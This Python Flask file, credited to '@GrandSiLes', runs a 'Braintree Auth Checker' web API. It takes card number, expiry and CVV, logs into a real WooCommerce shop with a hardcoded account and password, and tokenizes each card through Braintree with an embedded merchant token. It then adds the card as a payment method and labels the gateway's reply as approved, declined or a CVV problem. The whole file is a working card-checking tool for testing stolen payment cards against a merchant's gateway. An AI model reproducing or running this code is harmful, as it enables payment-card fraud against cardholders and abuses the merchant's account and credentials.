from flask import Flask, request, jsonify
import requests
import re
import json
from datetime import datetime
import os
import logging
from typing import Tuple, Optional, Dict, Any

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class BraintreeAuthChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://precisionpowdertx.com"
        self.braintree_auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ0MTUxODMsImp0aSI6IjUzZGFmY2EwLTg5YjMtNDY0Yy05MGYyLWU5YWM5MWJjMTQzNSIsInN1YiI6ImZzazZrdGd4ZjhoenBkdzQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzazZrdGd4ZjhoenBkdzQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXWSic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6eyJwYXlwYWxfY2xpZW50X2lkIjoiQVNkMHE2aVBQZXpGRnRNWUtydWNRUUcxVFZLdGh0bVhTVm5Eemtta0JwWjJraWJSRVVJZUpIOEJFd3hobjgzQklVeEJ5eU16TWhxWjk0ajcifX0.4j-mg5KvlOdklmqqWvpEdVLUQazQtWctYZ5HAPdkIm4oUbPtrkFn89oVyR7RmNPczBY-o-L1u4lpWBlLtzQVug"
        
        # Common headers
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
        }

    def parse_card_data(self, lista: str) -> Optional[Dict[str, str]]:
        """Parse card data from various formats"""
        try:
            parts = lista.split('|')
            if len(parts) != 4:
                return None
            
            cc = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvv = parts[3].strip()
            
            # Clean month
            mm = mm.split('/')[0] if '/' in mm else mm
            mm = mm.zfill(2)
            
            # Clean year
            yy = yy.split('/')[-1] if '/' in yy else yy
            if len(yy) == 4:  # Convert 2026 to 26
                yy = yy[2:]
            yy = yy.zfill(2)
            
            if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()):
                return None
                
            return {
                'cc': cc,
                'mm': mm,
                'yy': yy,
                'cvv': cvv,
                'bin': cc[:6]
            }
        except Exception as e:
            logger.error(f"Error parsing card data: {e}")
            return None

    def get_bin_info(self, bin_code: str) -> Dict[str, Any]:
        """Get BIN information from antipublic API"""
        try:
            url = f"https://bins.antipublic.cc/bins/{bin_code}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    'bank': data.get('bank', 'Unknown'),
                    'brand': data.get('brand', 'Unknown'),
                    'country': data.get('country_name', 'Unknown'),
                    'level': data.get('level', 'Unknown'),
                    'type': data.get('type', 'Unknown')
                }
        except Exception as e:
            logger.error(f"Error fetching BIN info: {e}")
        
        return {
            'bank': 'Unknown',
            'brand': 'Unknown',
            'country': 'Unknown',
            'level': 'Unknown',
            'type': 'Unknown'
        }

    def get_login_nonce(self) -> Tuple[Optional[str], Optional[str]]:
        """Get login nonce from my-account page"""
        try:
            url = f"{self.base_url}/my-account/"
            response = self.session.get(url, headers=self.headers, timeout=10)
            
            logger.info(f"Login page status: {response.status_code}")
            
            if response.status_code != 200:
                return None, f"Failed to load login page: {response.status_code}"
            
            # Extract login nonce
            nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
            if not nonce_match:
                # Try alternative pattern
                nonce_match = re.search(r'woocommerce-login-nonce["\']?[^>]*value=["\']?([^"\'>]+)', response.text)
            
            if not nonce_match:
                logger.error("Could not find login nonce in response")
                return None, "Could not find login nonce"
            
            nonce = nonce_match.group(1)
            logger.info(f"Found login nonce: {nonce}")
            return nonce, None
            
        except Exception as e:
            logger.error(f"Error getting login nonce: {str(e)}")
            return None, f"Error getting login nonce: {str(e)}"

    def is_logged_in(self, html_content: str) -> bool:
        """Check if login was successful"""
        patterns = [
            r'woocommerce-MyAccount-navigation',
            r'Log out</a>',
            r'Logout</a>',
            r'Sign out</a>',
            r'My Account</h2>',
            r'Dashboard</h2>',
            r'Welcome.*popalako09',  # Check for username in welcome message
            r'woocommerce-MyAccount-content'
        ]
        
        # Also check for elements that indicate NOT logged in
        not_logged_in_patterns = [
            r'Please log in',
            r'Create an account',
            r'Lost your password'
        ]
        
        has_logged_in = any(re.search(pattern, html_content, re.IGNORECASE) for pattern in patterns)
        has_not_logged_in = any(re.search(pattern, html_content, re.IGNORECASE) for pattern in not_logged_in_patterns)
        
        logger.info(f"Login check - logged in patterns: {has_logged_in}, not logged in patterns: {has_not_logged_in}")
        return has_logged_in and not has_not_logged_in

    def login(self) -> bool:
        """Login to the account"""
        try:
            # Get login nonce first
            nonce, error = self.get_login_nonce()
            if error:
                logger.error(f"Login failed - nonce error: {error}")
                return False
            
            # Login data
            login_data = {
                'username': 'popalako09@gmail.com',
                'password': '#Moha254$$',
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }
            
            login_headers = self.headers.copy()
            login_headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': f"{self.base_url}/my-account/",
                'cache-control': 'no-cache',
            })
            
            logger.info("Attempting login...")
            response = self.session.post(
                f"{self.base_url}/my-account/",
                data=login_data,
                headers=login_headers,
                timeout=15,
                allow_redirects=True
            )
            
            logger.info(f"Login response status: {response.status_code}")
            logger.info(f"Login response URL: {response.url}")
            
            # Check if login was successful
            logged_in = self.is_logged_in(response.text)
            logger.info(f"Login successful: {logged_in}")
            
            if not logged_in:
                # Check for error messages
                error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
                if error_match:
                    logger.error(f"Login error: {error_match.group(1).strip()}")
                else:
                    logger.error("Login failed - unknown reason")
            
            return logged_in
            
        except Exception as e:
            logger.error(f"Login error: {e}")
            return False

    def get_payment_nonce(self) -> Tuple[Optional[str], Optional[str]]:
        """Get payment nonce from add-payment-method page"""
        try:
            url = f"{self.base_url}/my-account/add-payment-method/"
            response = self.session.get(url, headers=self.headers, timeout=10)
            
            logger.info(f"Payment page status: {response.status_code}")
            logger.info(f"Payment page URL: {response.url}")
            
            if response.status_code != 200:
                return None, f"Failed to load payment page: {response.status_code}"
            
            # Debug the page content
            logger.info(f"Response length: {len(response.text)}")
            logger.info(f"Page contains 'woocommerce-add-payment-method-nonce': {'woocommerce-add-payment-method-nonce' in response.text}")
            
            # Try multiple patterns to find payment nonce - updated patterns
            patterns = [
                r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
                r'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
                r'woocommerce-add-payment-method-nonce["\'\s][^>]*value=["\']?([^"\'\s>]+)',
                r'<input[^>]*name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
                r'<input[^>]*id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"'
            ]
            
            for i, pattern in enumerate(patterns):
                nonce_match = re.search(pattern, response.text)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    logger.info(f"✅ Found payment nonce with pattern {i}: {nonce}")
                    return nonce, None
            
            # If no pattern matches, try to find any hidden input with nonce in name
            hidden_inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="[^"]*nonce[^"]*"[^>]*value="([^"]+)"', response.text)
            if hidden_inputs:
                logger.info(f"Found hidden nonce inputs: {hidden_inputs}")
                return hidden_inputs[0], None
            
            # Last resort: search for any nonce-like values
            all_nonces = re.findall(r'name="[^"]*nonce[^"]*"[^>]*value="([^"]+)"', response.text)
            if all_nonces:
                logger.info(f"Found all nonces: {all_nonces}")
                return all_nonces[0], None
            
            # Debug: Check if we're actually on the right page
            if "add-payment-method" not in response.url:
                return None, f"Not on payment method page. Redirected to: {response.url}"
            
            # Check if we're logged in
            if not self.is_logged_in(response.text):
                return None, "Not logged in when accessing payment page"
            
            logger.error("❌ Could not find payment nonce with any pattern")
            # Log a sample of the page to see what's there
            logger.info(f"Sample of response text (first 1000 chars): {response.text[:1000]}")
            return None, "Could not find payment nonce"
            
        except Exception as e:
            logger.error(f"Error getting payment nonce: {str(e)}")
            return None, f"Error getting payment nonce: {str(e)}"

    def tokenize_card(self, card_data: Dict[str, str]) -> Tuple[Optional[str], Optional[str]]:
        """Tokenize card through Braintree API"""
        try:
            braintree_headers = {
                'Authorization': f'Bearer {self.braintree_auth_token}',
                'Referer': 'https://assets.braintreegateway.com/',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '27be0c13-9aa1-4f78-8d2d-2dd4db17b238',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': card_data['cc'],
                            'expirationMonth': card_data['mm'],
                            'expirationYear': f"20{card_data['yy']}",
                            'cvv': card_data['cvv'],
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            logger.info("Tokenizing card...")
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=braintree_headers,
                json=json_data,
                timeout=10
            )
            
            logger.info(f"Braintree API response status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and 'tokenizeCreditCard' in data['data']:
                    token = data['data']['tokenizeCreditCard']['token']
                    logger.info(f"Card tokenized successfully: {token[:20]}...")
                    return token, None
                else:
                    error_msg = f"Tokenization failed: {data}"
                    logger.error(error_msg)
                    return None, error_msg
            else:
                error_msg = f"Braintree API error: {response.status_code} - {response.text}"
                logger.error(error_msg)
                return None, error_msg
                
        except Exception as e:
            logger.error(f"Tokenization error: {str(e)}")
            return None, f"Tokenization error: {str(e)}"

    def add_payment_method(self, token: str, payment_nonce: str) -> Tuple[Optional[str], Optional[str]]:
        """Add payment method to account"""
        try:
            payment_data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': token,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            
            payment_headers = self.headers.copy()
            payment_headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': f"{self.base_url}/my-account/add-payment-method/",
                'cache-control': 'no-cache',
            })
            
            logger.info("Adding payment method...")
            response = self.session.post(
                f"{self.base_url}/my-account/add-payment-method/",
                data=payment_data,
                headers=payment_headers,
                timeout=15,
                allow_redirects=True
            )
            
            logger.info(f"Payment method response status: {response.status_code}")
            
            # Extract response message
            error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
            if error_match:
                message = error_match.group(1).strip()
                logger.info(f"Payment error: {message}")
                return message, None
            else:
                # Check for success
                success_match = re.search(r'woocommerce-message', response.text)
                if success_match:
                    message = "Payment method added successfully"
                    logger.info(message)
                    return message, None
                else:
                    message = "Unknown response from payment method"
                    logger.warning(message)
                    return message, None
                    
        except Exception as e:
            logger.error(f"Payment method error: {str(e)}")
            return None, f"Payment method error: {str(e)}"

    def categorize_response(self, response_msg: str) -> str:
        """Categorize Braintree response"""
        response = response_msg.lower()

        approved_keywords = [
            "approved", "approved. check customer id", "processed", 
            "approved with risk", "approved for partial amount",
            "auth declined but settlement captured", "payment method added successfully"
        ]
        
        insufficient_keywords = [
            "insufficient funds", "limit exceeded", "cardholder's activity limit exceeded"
        ]
        
        ccn_cvv_keywords = [
            "invalid credit card number", "invalid expiration date", "card account length error",
            "card issuer declined cvv", "incorrect pin", "pin try exceeded", "invalid cvc",
            "invalid cvv", "security code", "address verification failed",
            "address verification and card security code failed",
            "credit card number does not match method of payment"
        ]

        live_keywords = [
            "cardholder authentication required", "additional authorization required",
            "3d secure", "mastercard securecode", "voice authorization required",
            "declined– call for approval"
        ]

        declined_keywords = [
            "do not honor", "expired card", "no account", "no such issuer",
            "possible lost card", "possible stolen card", "fraud suspected",
            "transaction not allowed", "cardholder stopped billing",
            "cardholder stopped all billing", "invalid transaction", "violation",
            "security violation", "declined", "call issuer", "pick up card",
            "card reported as lost or stolen", "closed card", "settlement declined",
            "processor declined", "declined– updated cardholder available",
            "error– do not retry, call issuer", "declined– call issuer",
            "invalid transaction data", "card not activated", "invalid credit card number"
        ]

        setup_error_keywords = [
            "processor does not support this feature", "card type not enabled",
            "set up error– merchant", "set up error– amount", "set up error– hierarchy",
            "set up error– card", "set up error– terminal", "invalid merchant id",
            "invalid merchant number", "invalid client id", "encryption error",
            "invalid currency code", "configuration error", "invalid authorization code",
            "invalid store", "invalid amount", "invalid sku number", "invalid credit plan",
            "invalid level iii purchase", "invalid transaction division number",
            "transaction amount exceeds the transaction division limit",
            "merchant not mastercard securecode enabled", "invalid tax amount",
            "invalid secure payment data", "invalid user credentials", "surcharge not permitted",
            "inconsistent data", "verifications are not supported on this merchant account"
        ]

        if any(kw in response for kw in approved_keywords):
            return "APPROVED"
        elif any(kw in response for kw in ccn_cvv_keywords):
            return "CCN/CVV ISSUE"
        elif any(kw in response for kw in live_keywords):
            return "3D/AUTH REQUIRED"
        elif any(kw in response for kw in insufficient_keywords):
            return "INSUFFICIENT FUNDS/LIMIT"
        elif any(kw in response for kw in setup_error_keywords):
            return "SETUP ERROR"
        elif any(kw in response for kw in declined_keywords):
            return "DECLINED"
        else:
            return "UNKNOWN STATUS"

    def check_card(self, lista: str) -> Dict[str, Any]:
        """Main card checking function"""
        # Parse card data
        card_data = self.parse_card_data(lista)
        if not card_data:
            return {
                "error": "Invalid card format. Use: ccn|mm|yy|cvv"
            }
        
        logger.info(f"Checking card: {card_data['cc'][:6]}******")
        
        # Get BIN info
        bin_info = self.get_bin_info(card_data['bin'])
        logger.info(f"BIN info: {bin_info}")
        
        # Login
        logger.info("Attempting to login...")
        if not self.login():
            return {
                "error": "Failed to login to account - check credentials or website availability"
            }
        
        # Get payment nonce
        logger.info("Getting payment nonce...")
        payment_nonce, error = self.get_payment_nonce()
        if error:
            return {
                "error": f"Failed to get payment nonce: {error}"
            }
        
        # Tokenize card
        logger.info("Tokenizing card with Braintree...")
        token, error = self.tokenize_card(card_data)
        if error:
            return {
                "error": f"Tokenization failed: {error}"
            }
        
        # Add payment method
        logger.info("Adding payment method...")
        response_msg, error = self.add_payment_method(token, payment_nonce)
        if error:
            return {
                "error": f"Payment method failed: {error}"
            }
        
        # Categorize response
        status = self.categorize_response(response_msg)
        logger.info(f"Final status: {status}")
        
        return {
            "Author": "@GrandSiLes",
            "Bank": bin_info['bank'],
            "Brand": bin_info['brand'],
            "CC": f"{card_data['cc']}|{card_data['mm']}|{card_data['yy']}|{card_data['cvv']}",
            "Country": bin_info['country'],
            "Gateway": "Braintree Auth",
            "Level": bin_info['level'],
            "Response": {
                "message": response_msg,
                "status": status
            },
            "Type": bin_info['type']
        }

# Initialize checker
checker = BraintreeAuthChecker()

@app.route('/b3chk', methods=['GET'])
def check_card():
    """Main API endpoint for card checking"""
    lista = request.args.get('lista')
    
    if not lista:
        return jsonify({
            "error": "Missing 'lista' parameter. Use: /b3chk?lista=ccn|mm|yy|cvv"
        }), 400
    
    try:
        result = checker.check_card(lista)
        return jsonify(result)
    except Exception as e:
        logger.error(f"API error: {e}")
        return jsonify({
            "error": f"Internal server error: {str(e)}"
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "service": "Braintree Auth Checker API"
    })

@app.route('/', methods=['GET'])
def home():
    """Home endpoint with usage instructions"""
    return jsonify({
        "message": "Braintree Auth Checker API",
        "author": "@GrandSiLes",
        "usage": "/b3chk?lista=5518277066313600|11|2026|190",
        "formats_supported": [
            "ccn|mm|yy|cvv",
            "ccn|mm|yyyy|cvv", 
            "ccn|mm/yy|cvv",
            "ccn|mm/yyyy|cvv"
        ],
        "endpoints": {
            "/b3chk": "Check card through Braintree Auth",
            "/health": "Health check",
            "/": "This help page"
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
